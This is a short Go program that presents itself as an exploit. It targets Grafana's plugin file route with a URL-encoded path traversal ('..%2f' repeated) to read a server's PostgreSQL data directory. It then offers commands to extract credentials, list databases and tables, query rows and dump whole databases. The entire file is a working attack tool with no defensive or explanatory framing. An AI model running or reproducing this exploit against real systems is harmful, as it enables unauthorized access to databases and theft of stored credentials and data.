package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: exploit <url> [--json] [command] [args...]")
		fmt.Println("commands: summary, creds, dbs, tables <db>, columns <db> <table>, query <db> <table>, dump [db]")
		os.Exit(1)
	}

	args := os.Args[2:]
	jsonOutput := false
	if len(args) > 0 && args[0] == "--json" {
		jsonOutput = true
		args = args[1:]
	}

	client := pgdump.NewRemoteClient(grafanaReader(os.Args[1], "/var/lib/postgresql/data"))

	if jsonOutput {
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		enc.Encode(client.Exec(args))
	} else {
		fmt.Print(client.ExecPretty(args))
	}
}

func grafanaReader(target, pgdata string) pgdump.RemoteReader {
	base := strings.TrimSuffix(target, "/")
	traversal := strings.Repeat("..%2f", 9)

	return func(path string) ([]byte, error) {
		resp, err := http.Get(base + "/public/plugins/alertlist/" + traversal + pgdata + "/" + path)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("%d", resp.StatusCode)
		}
		return io.ReadAll(resp.Body)
	}
}
